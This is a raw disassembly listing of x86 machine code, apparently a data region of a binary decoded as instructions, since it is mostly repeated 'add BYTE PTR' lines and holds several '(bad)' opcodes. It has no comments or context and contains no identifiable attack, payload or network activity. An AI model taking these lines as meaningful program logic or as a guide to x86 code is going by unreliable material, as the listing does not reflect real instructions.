  403b4f:	add    BYTE PTR [eax],ah
  403b51:	add    BYTE PTR [ecx+ebp*1+0x0],dl
  403b55:	add    BYTE PTR [eax],al
  403b57:	add    BYTE PTR [esi-0x16fa7ff8],al
  403b5d:	add    BYTE PTR [ecx],ah
  403b5f:	add    BYTE PTR [ecx+ebp*1+0x0],bl
  403b63:	add    BYTE PTR [eax],al
  403b65:	add    BYTE PTR [ecx-0x12fa6cf8],al
  403b6b:	add    BYTE PTR [ecx],ah
  403b6d:	add    BYTE PTR [ebp+0x29],ah
  403b70:	add    BYTE PTR [eax],al
  403b72:	add    BYTE PTR [eax],al
  403b74:	xchg   BYTE PTR [eax],cl
  403b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b77:	add    eax,0x2200f2
  403b7c:	ins    DWORD PTR es:[edi],dx
  403b7d:	sub    DWORD PTR [eax],eax
  403b7f:	add    BYTE PTR [eax],al
  403b81:	add    BYTE PTR [ecx-0x9fa4df8],al
  403b87:	add    BYTE PTR [edx],ah
  403b89:	add    BYTE PTR [esi+0x29],dh
  403b8c:	add    BYTE PTR [eax],al
  403b8e:	add    BYTE PTR [eax],al
  403b90:	xchg   BYTE PTR [eax],cl
  403b92:	mov    esi,0x2300f205
  403b97:	add    BYTE PTR [esi+0x29],bh
  403b9a:	add    BYTE PTR [eax],al
  403b9c:	add    BYTE PTR [eax],al
  403b9e:	or     DWORD PTR [eax],0xf605cc
  403ba4:	and    eax,DWORD PTR [eax]
  403ba6:	xchg   DWORD PTR [ecx],ebp
  403ba8:	add    BYTE PTR [eax],al
  403baa:	add    BYTE PTR [eax],al
  403bac:	xchg   BYTE PTR [eax],cl
  403bae:	fiadd  DWORD PTR ds:0x2400f2
  403bb4:	(bad)
  403bb8:	add    BYTE PTR [eax],al
  403bba:	or     DWORD PTR [eax],0xf605e7
  403bc0:	and    al,0x0
  403bc2:	cwde   
  403bc3:	sub    DWORD PTR [eax],eax
  403bc5:	add    BYTE PTR [eax],al
  403bc7:	add    BYTE PTR [esi+0x5105f400],al
  403bcd:	add    BYTE PTR ds:0x2c9900,ah
  403bd3:	add    BYTE PTR [eax],al
  403bd5:	add    BYTE PTR [ecx-0x4fa0600],dl
  403bdb:	add    BYTE PTR [esi],ah
  403bdd:	add    BYTE PTR [eax+0x2c],ch
  403be3:	add    BYTE PTR [ecx+0x13060100],al
  403be9:	add    BYTE PTR [eax],ch
  403beb:	add    BYTE PTR [ebp+ebp*1+0x0],bh
  403bef:	add    BYTE PTR [eax],al
  403bf1:	add    BYTE PTR [ecx+0x2063500],al
  403bf7:	add    DWORD PTR [eax],ebp
  403bf9:	add    al,bh
  403bfb:	sub    eax,0x0
  403c00:	add    DWORD PTR [eax],0x10d0647
  403c06:	sub    eax,DWORD PTR [eax]
  403c08:	dec    esp
  403c09:	add    BYTE PTR cs:[eax],al
  403c0c:	add    BYTE PTR [eax],al
  403c0e:	add    DWORD PTR [eax],0x1130658
  403c14:	sub    eax,0x2ea800
  403c19:	add    BYTE PTR [eax],al
  403c1b:	add    BYTE PTR [esi+0x37081900],dl
  403c21:	add    DWORD PTR [esi],ebp
  403c23:	add    ah,ch
  403c25:	add    BYTE PTR cs:[eax],al
  403c28:	add    BYTE PTR [eax],al
  403c2a:	xchg   esi,eax
  403c2b:	add    BYTE PTR [eax+ecx*1],ch
  403c2e:	inc    ebp
  403c2f:	add    DWORD PTR [eax+eax*1],esi
  403c32:	adc    BYTE PTR [edi],ch
  403c34:	add    BYTE PTR [eax],al
  403c36:	add    BYTE PTR [eax],al
  403c38:	xchg   esi,eax
  403c39:	add    BYTE PTR [esi],bh
  403c3b:	or     BYTE PTR [ebp+0x1],al
  403c3e:	xor    al,0x0
  403c40:	xor    BYTE PTR [edi],ch
  403c42:	add    BYTE PTR [eax],al
  403c44:	add    BYTE PTR [eax],al
  403c46:	xchg   esi,eax
  403c47:	add    BYTE PTR [ecx+0x8],dl
  403c4a:	inc    ebp
  403c4b:	add    DWORD PTR [eax+eax*1],esi
  403c4e:	push   eax
  403c4f:	das    
  403c50:	add    BYTE PTR [eax],al
  403c52:	add    BYTE PTR [eax],al
  403c54:	xchg   esi,eax
  403c55:	add    BYTE PTR [ebp+0x8],ah
  403c58:	dec    ecx
  403c59:	add    DWORD PTR [eax+eax*1],esi
  403c5c:	jo     0x403c8d
  403c5e:	add    BYTE PTR [eax],al
  403c60:	add    BYTE PTR [eax],al
  403c62:	xchg   ecx,eax
  403c63:	add    BYTE PTR [edi+0x8],bh
  403c66:	dec    edi
  403c67:	add    DWORD PTR ds:0x2fa800,esi
  403c6d:	add    BYTE PTR [eax],al
  403c6f:	add    BYTE PTR [ecx+0x45088800],dl
  403c75:	add    DWORD PTR [esi],esi
  403c77:	add    BYTE PTR [eax],cl
  403c79:	xor    BYTE PTR [eax],al
  403c7b:	add    BYTE PTR [eax],al
  403c7d:	add    BYTE PTR [ecx+0x54089500],dl
  403c83:	add    DWORD PTR [esi],esi
  403c85:	add    BYTE PTR [ebx+0x30],al
  403c88:	add    BYTE PTR [eax],al
  403c8a:	add    BYTE PTR [eax],al
  403c8c:	xchg   ecx,eax
  403c8d:	sbb    dh,ch
  403c8f:	adc    eax,DWORD PTR [ebp+0x1]
  403c92:	cmp    BYTE PTR [eax],al
  403c94:	add    BYTE PTR [eax],al
  403c96:	add    BYTE PTR [eax],al
  403c98:	add    BYTE PTR [eax],0x96
  403c9b:	and    BYTE PTR [ecx],bl
  403c9d:	or     ch,dl
  403c9f:	add    DWORD PTR [eax],edi
  403ca1:	add    BYTE PTR [eax],al
  403ca3:	add    BYTE PTR [eax],al
  403ca5:	add    BYTE PTR [eax+0x2c209600],al
  403cab:	or     dh,bl
  403cad:	add    DWORD PTR ds:0x0,edi
  403cb3:	add    BYTE PTR [eax+0x3e209600],al
  403cb9:	or     dh,bl
  403cbb:	add    DWORD PTR ds:0x0,edi
  403cc1:	add    BYTE PTR [eax+0x51209600],al
  403cc7:	or     dh,bl
  403cc9:	add    DWORD PTR ds:0x0,edi
  403ccf:	add    BYTE PTR [eax+0x65209600],al
  403cd5:	or     dl,ah
  403cd7:	add    DWORD PTR ds:0x0,edi
  403cdd:	add    BYTE PTR [eax+0x7f209600],al
  403ce3:	or     dh,bl
  403ce5:	add    DWORD PTR [esi],edi
  403ce7:	add    BYTE PTR [edi+0x30],cl
  403cea:	add    BYTE PTR [eax],al
  403cec:	add    BYTE PTR [eax],al
  403cee:	sbb    DWORD PTR [eax],0x8
  403cf1:	add    dl,BYTE PTR [ebx]
  403cf3:	add    BYTE PTR [esi],bh
  403cf5:	add    BYTE PTR [eax+0x30],bl
  403cf8:	add    BYTE PTR [eax],al
  403cfa:	add    BYTE PTR [eax],al
  403cfc:	xchg   ebx,eax
  403cfd:	or     BYTE PTR [ecx],ch
  403cff:	or     eax,esi
  403d01:	add    DWORD PTR [esi],edi
  403d03:	add    BYTE PTR [edi+0x30],dl
  403d09:	add    BYTE PTR [ebx-0xaf6c2f8],dl
  403d0f:	add    DWORD PTR [esi],edi
  403d11:	add    BYTE PTR [esi+0x30],bl
  403d17:	add    BYTE PTR [ebx-0x5f6b6f8],dl
  403d1d:	add    DWORD PTR [esi],edi
  403d1f:	add    BYTE PTR [esi+0x30],ah
  403d25:	add    BYTE PTR [ebx+0x95508],dl
  403d2b:	add    bh,BYTE PTR [edi]
  403d2d:	add    BYTE PTR [eax+esi*1+0x0],bh
  403d34:	xchg   ebx,eax
  403d35:	or     BYTE PTR [edx+0x9],ch
  403d38:	add    BYTE PTR [edx],al
  403d3a:	aas    
  403d3b:	add    dl,dl
  403d3d:	xor    BYTE PTR [eax],al
  403d3f:	add    BYTE PTR [eax],al
  403d41:	add    BYTE PTR [ebx+0x97e08],dl
  403d47:	add    bh,BYTE PTR [edi]
  403d49:	add    al,ch
  403d4b:	xor    BYTE PTR [eax],al
  403d4d:	add    BYTE PTR [eax],al
  403d4f:	add    BYTE PTR [ebx+0x98d08],dl
  403d55:	add    bh,BYTE PTR [edi]
  403d57:	add    dh,bh
  403d59:	xor    BYTE PTR [eax],al
  403d5b:	add    BYTE PTR [eax],al
  403d5d:	add    BYTE PTR [ebx+0x99d08],dl
  403d63:	add    bh,BYTE PTR [edi]
  403d65:	add    BYTE PTR [ecx+esi*1],dl
  403d68:	add    BYTE PTR [eax],al
  403d6a:	add    BYTE PTR [eax],al
  403d6c:	xchg   ebx,eax
  403d6d:	or     BYTE PTR [ecx+ecx*1+0x3f0200],ch
  403d74:	sub    dh,BYTE PTR [ecx]
  403d76:	add    BYTE PTR [eax],al
  403d78:	add    BYTE PTR [eax],al
  403d7a:	xchg   ebx,eax
  403d7b:	or     BYTE PTR [edx+0x3f020009],bh
  403d81:	add    BYTE PTR [eax],al
  403d83:	add    BYTE PTR [ecx],al
  403d85:	add    BYTE PTR [ebx],ch
  403d87:	or     al,BYTE PTR [eax]
  403d89:	add    BYTE PTR [edx],al
  403d8b:	add    BYTE PTR [ebx],dh
  403d8d:	or     al,BYTE PTR [eax]
  403d8f:	add    BYTE PTR [ebx],al
  403d91:	add    BYTE PTR ds:0x400000a,bh
  403d97:	add    BYTE PTR [ecx+0xa],cl
  403d9a:	add    BYTE PTR [eax],al
  403d9c:	add    eax,0xa5500
  403da1:	add    BYTE PTR [ecx],al
  403da3:	add    BYTE PTR [edx+ecx*1+0x0],ah
  403da7:	add    BYTE PTR [edx],al
  403da9:	add    BYTE PTR [eax+0xa],dh
  403dac:	add    BYTE PTR [eax],al
  403dae:	add    DWORD PTR [eax],eax
  403db0:	or     al,BYTE PTR fs:[eax]
  403db3:	add    BYTE PTR [edx],al
  403db5:	add    BYTE PTR [eax+0xa],dh
  403db8:	add    BYTE PTR [eax],al
  403dba:	add    eax,DWORD PTR [eax]
  403dbc:	jns    0x403dc8
  403dbe:	add    BYTE PTR [eax],al
  403dc0:	add    DWORD PTR [eax],eax
  403dc2:	or     DWORD PTR [edx],0x10000
  403dc8:	xchg   BYTE PTR [edx],cl
  403dca:	add    BYTE PTR [eax],al
  403dcc:	add    al,BYTE PTR [eax]
  403dce:	lea    ecx,[edx]
  403dd0:	add    BYTE PTR [eax],al
  403dd2:	add    DWORD PTR [eax],eax
  403dd4:	sub    ecx,DWORD PTR [edx]
  403dd6:	add    BYTE PTR [eax],al
  403dd8:	add    al,BYTE PTR [eax]
  403dda:	xor    ecx,DWORD PTR [edx]
  403ddc:	add    BYTE PTR [eax],al
  403dde:	add    eax,DWORD PTR [eax]
  403de0:	cmp    eax,0x400000a
  403de5:	add    BYTE PTR [ecx+0xa],cl
  403de8:	add    BYTE PTR [eax],al
  403dea:	add    eax,0xa5500
  403def:	add    BYTE PTR [ecx],al
  403df1:	add    BYTE PTR [edi+0x100000a],dl
  403df7:	add    BYTE PTR [edi+0x100000a],dl
  403dfd:	add    BYTE PTR [esi+0x200000a],al
  403e03:	add    BYTE PTR [ebp+0x100000a],cl
  403e09:	add    BYTE PTR [esi+0x200000a],al
  403e0f:	add    BYTE PTR [ebp+0x100000a],cl
  403e15:	add    BYTE PTR [ecx+0xa],bh
  403e18:	add    BYTE PTR [eax],al
  403e1a:	add    DWORD PTR [eax],eax
  403e1c:	cwde   
  403e1d:	adc    DWORD PTR [eax],eax
  403e1f:	add    BYTE PTR [ecx],al
  403e21:	add    BYTE PTR [edx+0x100000a],ah
  403e27:	add    BYTE PTR [edx+0x100000a],ah
  403e2d:	add    BYTE PTR [edx+0x100000a],ah
  403e33:	add    BYTE PTR [edx+0x100000a],ah
  403e39:	add    BYTE PTR [edx+0x100000a],ah
  403e3f:	add    BYTE PTR [edx+0x100000a],ah
  403e45:	add    BYTE PTR [edx+0x100000a],ah
  403e4b:	add    BYTE PTR [edx+0x100000a],ah
  403e51:	add    BYTE PTR [edx+0x100000a],ah
  403e57:	add    BYTE PTR [edx+0x100000a],ah
  403e5d:	add    BYTE PTR [edi+0x100000a],dl
  403e63:	add    BYTE PTR [eax+0x200000a],ch
  403e69:	add    BYTE PTR [ecx+0x100000a],al
  403e6f:	add    ah,al
  403e71:	or     al,BYTE PTR [eax]
  403e73:	add    BYTE PTR [edx],al
  403e75:	add    BYTE PTR [edx+0x300000a],ah
  403e7b:	add    ch,cl
  403e7d:	or     al,BYTE PTR [eax]
  403e7f:	add    BYTE PTR [ecx],al
  403e81:	add    ah,al
  403e83:	or     al,BYTE PTR [eax]
  403e85:	add    BYTE PTR [edx],al
  403e87:	add    BYTE PTR [edx+0x100000a],ah
  403e8d:	add    ch,cl
  403e8f:	or     al,BYTE PTR [eax]
  403e91:	add    BYTE PTR [ecx],al
  403e93:	add    BYTE PTR [ebx],ch
  403e95:	or     al,BYTE PTR [eax]
  403e97:	add    BYTE PTR [edx],al
  403e99:	add    BYTE PTR [ebx],dh
  403e9b:	or     al,BYTE PTR [eax]
  403e9d:	add    BYTE PTR [ebx],al
  403e9f:	add    BYTE PTR ds:0x400000a,bh
  403ea5:	add    BYTE PTR [ecx+0xa],cl
  403ea8:	add    BYTE PTR [eax],al
  403eaa:	add    eax,0xa5500
  403eaf:	add    BYTE PTR [esi],al
  403eb1:	add    ch,dl
  403eb3:	or     al,BYTE PTR [edx]
  403eb5:	add    BYTE PTR [ecx],al
  403eb7:	add    dh,bl
  403eb9:	or     al,BYTE PTR [eax]
  403ebb:	add    BYTE PTR [ecx],al
  403ebd:	add    BYTE PTR ds:0x100000b,dl
  403ec3:	add    BYTE PTR [ecx],bl
  403ec5:	or     eax,DWORD PTR [eax]
  403ec7:	add    BYTE PTR [edx],al
  403ec9:	add    BYTE PTR [ebx],ah
  403ecb:	or     eax,DWORD PTR [eax]
  403ecd:	add    BYTE PTR [ecx],al
  403ecf:	add    BYTE PTR [ebx],ch
  403ed1:	or     al,BYTE PTR [eax]
  403ed3:	add    BYTE PTR [edx],al
  403ed5:	add    BYTE PTR [ebx],dh
  403ed7:	or     al,BYTE PTR [eax]
  403ed9:	add    BYTE PTR [ebx],al
  403edb:	add    BYTE PTR ds:0x400000a,bh
  403ee1:	add    BYTE PTR [ecx+0xa],cl
  403ee4:	add    DWORD PTR [eax],esp
  403ee6:	add    eax,0x20a5500
  403eeb:	and    BYTE PTR [ecx],al
  403eed:	add    dh,bl
  403eef:	or     al,BYTE PTR [eax]
  403ef1:	add    BYTE PTR [ecx],al
  403ef3:	add    BYTE PTR [edx+0x800050a],ah
  403ef9:	add    BYTE PTR ds:0x81000d00,al
  403eff:	add    BYTE PTR [eax],cl
  403f01:	add    dl,BYTE PTR [ebx]
  403f03:	add    BYTE PTR [ecx+0x13020800],cl
  403f09:	add    BYTE PTR [ecx+0x17020800],dl
  403f0f:	add    ah,BYTE PTR [ecx+0x13020800]
  403f15:	add    BYTE PTR [ecx-0x12fdf800],ch
  403f1b:	add    BYTE PTR [ecx-0x26fdf800],dh
  403f21:	add    BYTE PTR [ecx-0x26fdf800],bh
  403f27:	add    cl,al
  403f29:	add    BYTE PTR [eax],cl
  403f2b:	add    ch,ch
  403f2d:	add    cl,cl
  403f2f:	add    BYTE PTR [eax],cl
  403f31:	add    ch,ch
  403f33:	add    cl,dl
  403f35:	add    BYTE PTR [eax],cl
  403f37:	add    ch,ch
  403f39:	add    cl,bl
  403f3b:	add    BYTE PTR [eax],cl
  403f3d:	add    ch,ch
  403f3f:	add    cl,ah
  403f41:	add    BYTE PTR [eax],cl
  403f43:	add    ch,ch
  403f45:	add    cl,ch
  403f47:	add    BYTE PTR [eax],cl
  403f49:	add    ch,ch
  403f4b:	add    cl,dh
  403f4d:	add    BYTE PTR [eax],cl
  403f4f:	add    ch,ch
  403f51:	add    cl,bh
  403f53:	add    BYTE PTR [eax],cl
  403f55:	add    ch,ch
  403f57:	add    BYTE PTR [ecx],al
  403f59:	add    DWORD PTR [eax],ecx
  403f5b:	add    ch,ch
  403f5d:	add    BYTE PTR [ecx],cl
  403f5f:	add    DWORD PTR [eax],ecx
  403f61:	add    ch,ch
  403f63:	add    BYTE PTR [ecx],dl
  403f65:	add    DWORD PTR [eax],ecx
  403f67:	add    ch,ch
  403f69:	add    BYTE PTR [ecx],bl
  403f6b:	add    DWORD PTR [eax],ecx
  403f6d:	add    bl,cl
  403f6f:	add    BYTE PTR [ecx],ah
  403f71:	add    DWORD PTR [eax],ecx
  403f73:	add    ch,ch
  403f75:	add    BYTE PTR [ecx],ch
  403f77:	add    DWORD PTR [eax],ecx
  403f79:	add    dl,BYTE PTR [ebx]
  403f7b:	add    BYTE PTR [ecx],dh
  403f7d:	add    DWORD PTR [eax],ecx
  403f7f:	add    ch,ch
  403f81:	add    BYTE PTR [ecx],bh
  403f83:	add    DWORD PTR [eax],ecx
  403f85:	add    ah,BYTE PTR [ecx]
  403f87:	add    cl,BYTE PTR [ecx+0x1]
  403f8a:	or     BYTE PTR [edx],al
  403f8c:	outs   dx,BYTE PTR ds:[esi]
  403f8d:	add    BYTE PTR [ecx+0x1],dl
  403f90:	aad    0xd
  403f92:	retf   0x5902
  403f95:	add    edi,ebp
  403f97:	or     eax,0x7902cf
  403f9c:	test   DWORD PTR ds:0x901f5,0xe90e0c
  403fa6:	popa   
  403fa7:	add    edx,edi
  403fa9:	add    eax,0x17102d5
  403fae:	ss push cs
  403fb0:	fild   WORD PTR [edx]
  403fb2:	jns    0x403fb5
  403fb4:	or     BYTE PTR [edx],al
  403fb6:	in     eax,0x2
  403fb8:	jno    0x403fbb
  403fba:	addr16 push cs
  403fbc:	jmp    0x403fc0
  403fbe:	and    DWORD PTR [eax],eax
  403fc0:	jle    0x403fd0
  403fc2:	push   0x0
  403fc4:	or     DWORD PTR [eax],eax
  403fc6:	or     BYTE PTR [edx],al
  403fc8:	adc    eax,DWORD PTR [eax]
  403fca:	push   ecx
  403fcb:	add    ebp,edx
  403fcd:	or     eax,0x1610301
  403fd2:	mov    al,ds:0x5103080e
  403fd7:	add    DWORD PTR [ebx+0x5103010e],esi
  403fdd:	add    DWORD PTR [ebx+0xc02ca0e],esi
  403fe3:	add    BYTE PTR [eax],cl
  403fe5:	add    ah,ch
  403fe7:	add    bl,BYTE PTR [ecx+0x1f0ed201]
  403fed:	add    esp,DWORD PTR [ecx-0x2af117ff]
  403ff3:	add    BYTE PTR [ecx+0x130ef701],ch
  403ff9:	add    BYTE PTR [ecx+0x4f0efd01],bl
  403fff:	add    DWORD PTR [ecx+0x2b0f0201],ebp
  404005:	add    eax,DWORD PTR [ecx+0x0]
  404008:	or     BYTE PTR [edx],al
  40400a:	fld    DWORD PTR [eax]
  40400c:	mov    cl,0x1
  40400e:	and    cl,BYTE PTR [edi]
  404010:	cmp    eax,DWORD PTR [ebx]
  404012:	rol    DWORD PTR [ecx],0x41
  404015:	cmovae eax,DWORD PTR [ebx]
  404018:	rol    DWORD PTR [ecx],1
  40401a:	pop    ebp
  40401b:	cmovl  eax,DWORD PTR [ebx]
  40401e:	push   ecx
  40401f:	add    DWORD PTR [edi+0xf],esp
  404022:	add    DWORD PTR [ebx],eax
  404024:	fld    DWORD PTR [ecx]
  404026:	std    
  404027:	push   cs
  404028:	push   esp
  404029:	add    edx,DWORD PTR [ecx+0x0]
  40402c:	jle    0x40403d
  40402e:	add    edx,DWORD PTR fs:[ecx+0x0]
  404032:	nop
  404033:	psubsw mm0,QWORD PTR [eax]
  404036:	pop    ecx
  404037:	add    DWORD PTR [eax-0x16fc96f1],esp
  40403d:	add    DWORD PTR [eax],ecx
  40403f:	add    dl,BYTE PTR [ebx]
  404041:	add    cl,ch
  404043:	add    ebp,ecx
  404045:	(bad)  
  404047:	add    esi,ecx
  404049:	add    DWORD PTR [eax],eax
  40404b:	adc    BYTE PTR [ebx+0x3],dh
  40404e:	icebp  
  40404f:	add    DWORD PTR [ebx],ecx
  404051:	adc    cl,ch
  404053:	add    cl,bh
  404055:	add    DWORD PTR [eax],ecx
  404057:	add    dl,BYTE PTR [ebx]
  404059:	add    cl,bh
  40405b:	add    DWORD PTR [edi+0x9037910],ecx
  404061:	add    cl,BYTE PTR [eax]
  404063:	add    dl,BYTE PTR [ebx]
  404065:	add    BYTE PTR [ecx],ch
  404067:	add    BYTE PTR [eax],cl
  404069:	add    al,BYTE PTR [eax+0x20022903]
  40406f:	adc    DWORD PTR [ebp+0x3001b103],ecx
  404075:	adc    DWORD PTR [ebx+0x3b022903],ebp
  40407b:	adc    DWORD PTR [ecx+0x4d005103],esi
  404081:	adc    ecx,ebx
  404083:	add    BYTE PTR [ecx],bh
  404085:	add    cl,BYTE PTR [eax]
  404087:	add    ah,ch
  404089:	add    dl,BYTE PTR [ecx+0x0]
  40408c:	jb     0x40409f
  40408e:	rol    BYTE PTR [ebx],0x41
  404091:	add    cl,BYTE PTR [eax]
  404093:	add    dl,BYTE PTR [ebx]
  404095:	add    BYTE PTR [ecx+0x2],cl
  404098:	(bad)  
  404099:	adc    DWORD PTR [ebx+eax*1+0x51],edx
  40409d:	add    cl,BYTE PTR [eax]
  40409f:	add    ah,ch
  4040a1:	add    bl,BYTE PTR [ecx+0x2]
  4040a4:	out    dx,al
  4040a5:	adc    esp,ecx
  4040a7:	add    ebx,DWORD PTR [ecx+0x2]
  4040aa:	add    DWORD PTR [edx],edx
  4040ac:	retf   0x6102
  4040af:	add    cl,BYTE PTR [eax]
  4040b1:	add    ah,ch
  4040b3:	add    ch,BYTE PTR [ecx+0x2]
  4040b6:	and    edx,DWORD PTR [edx]
  4040b8:	rol    DWORD PTR [ebx],cl
  4040ba:	pop    ecx
  4040bb:	add    al,BYTE PTR [ecx]
  4040bd:	adc    ah,al
  4040bf:	add    edx,DWORD PTR [ecx]
  4040c1:	add    BYTE PTR [eax],cl
  4040c3:	add    dl,BYTE PTR [ebx]
  4040c5:	add    BYTE PTR [eax+eax*1],dl
  4040c8:	or     BYTE PTR [edx],al
  4040ca:	adc    eax,DWORD PTR [eax]
  4040cc:	popa   
  4040cd:	add    DWORD PTR [esi+0x12],eax
  4040d0:	test   BYTE PTR [ebx],0x81
  4040d3:	add    DWORD PTR [ebp+0x12],ecx
  4040d6:	inc    DWORD PTR [ebx]
  4040d8:	push   ecx
  4040d9:	add    BYTE PTR [esi+0x12],dl
  4040dc:	push   es
  4040dd:	add    al,0x14
  4040df:	add    BYTE PTR [ebp+0x12],ah
  4040e2:	or     al,0x4
  4040e4:	jns    0x4040e8
  4040e6:	jb     0x4040fa
  4040e8:	adc    al,BYTE PTR [ecx+edi*2]
  4040eb:	add    al,BYTE PTR [edi-0x7eff16ee]
  4040f1:	add    ah,BYTE PTR [edx+edx*1+0x790418]
  4040f8:	mov    bl,0x12
  4040fa:	cmc    
  4040fb:	add    DWORD PTR [ecx-0x16ed39fe],eax
  404101:	add    BYTE PTR [ecx+0x42133302],cl
  404107:	add    al,0x91
  404109:	add    al,BYTE PTR [ebx+0x13]
  40410c:	dec    eax
  40410d:	add    al,0x89
  40410f:	add    DWORD PTR [ebp+0x12],ecx
  404112:	dec    ebp
  404113:	add    al,0x61
  404115:	add    DWORD PTR [ebx+edx*1+0x8],ecx
  404119:	add    ebx,DWORD PTR [ecx+0x62124d02]
  40411f:	add    al,0x61
  404121:	add    DWORD PTR [ecx+0x13],esp
  404124:	jb     0x40412a
  404126:	adc    al,0x0
  404128:	js     0x40413d
  40412a:	jl     0x404130
  40412c:	sbb    al,0x0
  40412e:	xchg   BYTE PTR [ebx],dl
  404130:	lea    eax,[esp+ebx*1]
  404133:	add    BYTE PTR [edx+0x1900d513],dl
  404139:	add    BYTE PTR [ecx],bh
  40413b:	add    dl,BYTE PTR [ebx]
  40413d:	add    BYTE PTR [ecx-0x1afdf7fe],ch
  404143:	add    ch,BYTE PTR [ecx+0x0]
  404146:	or     BYTE PTR [edx],al
  404148:	pushf  
  404149:	add    al,0xb1
  40414b:	add    cl,BYTE PTR [eax]
  40414d:	add    ch,ch
  40414f:	add    BYTE PTR [eax+eax*1],cl
  404152:	mov    ebx,0x69040c13
  404157:	add    dl,al
  404159:	adc    esi,DWORD PTR [ebx+0x39006904]
  40415f:	add    dl,BYTE PTR [ebx]
  404161:	add    BYTE PTR [ecx+0x1],dl
  404164:	addr16 bswap edx
  404167:	add    bh,BYTE PTR [ecx-0x46fdf7fe]
  40416d:	add    al,0xc1
  40416f:	add    cl,BYTE PTR [eax]
  404171:	add    ch,ch
  404173:	add    cl,cl
  404175:	add    cl,BYTE PTR [eax]
  404177:	add    al,ch
  404179:	add    al,0xd1
  40417b:	add    cl,BYTE PTR [eax]
  40417d:	add    dl,BYTE PTR [ebx]
  40417f:	add    BYTE PTR [ecx],cl
  404181:	add    BYTE PTR [eax-0x3efaf3ec],dl
  404187:	add    DWORD PTR [eax+0x71051214],esp
  40418d:	add    BYTE PTR [eax],cl
  40418f:	add    bl,BYTE PTR [eax]
  404191:	add    eax,0x14ad0071
  404196:	and    eax,0x802d905
  40419b:	add    ch,BYTE PTR [eax*1+0x4000e]
  4041a2:	add    BYTE PTR ss:[esi],cl
  4041a5:	add    BYTE PTR [eax+eax*1],ah
  4041a8:	mov    eax,DWORD PTR [eax]
  4041aa:	push   cs
  4041ab:	add    BYTE PTR [eax],ch
  4041ad:	add    BYTE PTR [edx+0x2c000e00],bl
  4041b3:	add    BYTE PTR [ebp+0x30000e00],ch
  4041b9:	add    BYTE PTR [esi+0x64000e00],bh
  4041bf:	add    BYTE PTR [esi+0x1],bl
  4041c2:	cs add bl,al
  4041c5:	add    BYTE PTR [edx],bl
  4041c7:	or     BYTE PTR [esi],ch
  4041c9:	add    BYTE PTR [ebx+0x0],al
  4041cc:	pop    DWORD PTR ds:0x4b002e
  4041d2:	pop    DWORD PTR ds:0xbb002e
  4041d8:	xor    eax,DWORD PTR ds:0x5b002e
  4041de:	rol    BYTE PTR ds:0xb3002e,0xaa
  4041e5:	push   es
  4041e6:	add    BYTE PTR cs:[ebx],ch
  4041e9:	add    BYTE PTR [eax*1+0x33002e],bh
  4041f0:	add    DWORD PTR ds:0x3b002e,0xffffff89
  4041f7:	add    eax,0x53002e
  4041fc:	pop    DWORD PTR ds:0x63002e
  404202:	fild   DWORD PTR ds:0x6b002e
  404208:	add    DWORD PTR [esi],eax
  40420a:	add    BYTE PTR cs:[ebx+0x0],bh
  40420e:	xor    eax,0x83002e06
  404213:	add    BYTE PTR ds:0x8b002e06,dh
  404219:	add    BYTE PTR [edi+0x6],al
  40421c:	add    BYTE PTR cs:[ebx+0x2e065500],dl
  404223:	add    BYTE PTR [ebx+0x2e058900],bl
  404229:	add    BYTE PTR [ebx+0x2e066000],ah
  40422f:	add    BYTE PTR [ebx+0x23068b00],ch
  404235:	add    DWORD PTR [ebx+0x3],ebx
  404238:	adc    al,BYTE PTR [edx]
  40423a:	and    eax,DWORD PTR [ecx]
  40423c:	and    eax,DWORD PTR [edx]
  40423e:	adc    al,BYTE PTR [edx]
  404240:	and    eax,DWORD PTR [ecx]
  404242:	push   ebx
  404243:	add    ecx,ebx
  404245:	add    al,0x69
  404247:	add    DWORD PTR [ebx-0x76faccfd],eax
  40424d:	add    DWORD PTR [ebx-0x5efaccfd],eax
  404253:	add    DWORD PTR [ebx],esp
  404255:	add    dl,BYTE PTR [edx]
  404257:	add    al,cl
  404259:	add    DWORD PTR [ebx],esp
  40425b:	add    dl,BYTE PTR [edx]
  40425d:	add    ah,cl
  40425f:	add    DWORD PTR [ebx],esp
  404261:	add    dl,BYTE PTR [edx]
  404263:	add    al,BYTE PTR [ecx]
  404265:	add    ah,BYTE PTR [ebx]
  404267:	add    dl,BYTE PTR [edx]
  404269:	add    ah,BYTE PTR [ecx]
  40426b:	add    ah,BYTE PTR [ebx]
  40426d:	add    dl,BYTE PTR [edx]
  40426f:	add    al,BYTE PTR [ecx+0x2]
  404272:	and    eax,DWORD PTR [edx]
  404274:	adc    al,BYTE PTR [edx]
  404276:	popa   
  404277:	add    ah,BYTE PTR [ebx]
  404279:	add    dl,BYTE PTR [edx]
  40427b:	add    al,BYTE PTR [ecx+0x12022302]
  404281:	add    ah,BYTE PTR [ecx+0x12022302]
  404287:	add    al,cl
  404289:	add    ah,BYTE PTR [ebx]
  40428b:	add    dl,BYTE PTR [edx]
  40428d:	add    ah,BYTE PTR [eax+0x3]
  404290:	and    eax,DWORD PTR [edx]
  404292:	adc    al,BYTE PTR [edx]
  404294:	mov    al,ds:0x12022303
  404299:	add    al,al
  40429b:	add    esp,DWORD PTR [ebx]
  40429d:	add    dl,BYTE PTR [edx]
  40429f:	add    ah,al
  4042a1:	add    esp,DWORD PTR [ebx]
  4042a3:	add    dl,BYTE PTR [edx]
  4042a5:	add    al,BYTE PTR [eax]
  4042a7:	add    al,0x23
  4042a9:	add    dl,BYTE PTR [edx]
  4042ab:	add    ah,BYTE PTR [eax]
  4042ad:	add    al,0x23
  4042af:	add    dl,BYTE PTR [edx]
  4042b1:	add    al,BYTE PTR [eax+0x4]
  4042b4:	and    eax,DWORD PTR [edx]
  4042b6:	adc    al,BYTE PTR [edx]
  4042b8:	pusha  
  4042b9:	add    al,0x23
  4042bb:	add    dl,BYTE PTR [edx]
  4042bd:	add    al,BYTE PTR [eax+0x12022304]
  4042c3:	add    ah,BYTE PTR [eax+0x12022304]
  4042c9:	add    al,al
  4042cb:	add    al,0x23
  4042cd:	add    dl,BYTE PTR [edx]
  4042cf:	add    ah,al
  4042d1:	add    al,0x23
  4042d3:	add    dl,BYTE PTR [edx]
  4042d5:	add    ah,ah
  4042d7:	add    al,0xb
  4042d9:	add    BYTE PTR [edx],dl
  4042db:	add    al,BYTE PTR [eax]
  4042dd:	add    eax,0x2120223
  4042e2:	and    BYTE PTR ds:0x2120223,al
  4042e8:	inc    eax
  4042e9:	add    eax,0x2120223
  4042ee:	pusha  
  4042ef:	add    eax,0x2120223
  4042f4:	add    BYTE PTR ds:0x2120223,0xa0
